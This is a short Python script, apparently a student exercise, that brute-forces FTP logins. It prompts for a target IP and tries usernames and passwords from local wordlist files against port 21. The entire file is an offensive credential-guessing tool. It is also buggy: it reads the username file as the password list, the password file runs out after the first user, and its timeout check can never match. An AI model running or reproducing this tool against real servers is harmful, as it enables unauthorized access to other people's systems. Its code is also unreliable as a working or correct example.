import ftplib


try:
    #wordlist= open(r"userlist.txt")
    target= input("Enter IP: ")
    server= ftplib.FTP()
    
    users= open(r"C:\FILES\Cyber\Phase3\Python\userlist.txt")
    passwords= open(r"C:\FILES\Cyber\Phase3\Python\userlist.txt")

    for u in users:
        try:
            u= u.replace("\n","")
            for p in passwords:
                p = p.replace("\n","")
                server.connect(target,21,timeout=2)
                server.login(u,p)
                print(f"Connected with {u} and {p}")
                break

        except Exception as error:
            if "timed out" in {error}:
                print("Invalid")
            #else:
                #print(f"{server.lastresp}  {error}")
    
except Exception as error:
    print(error)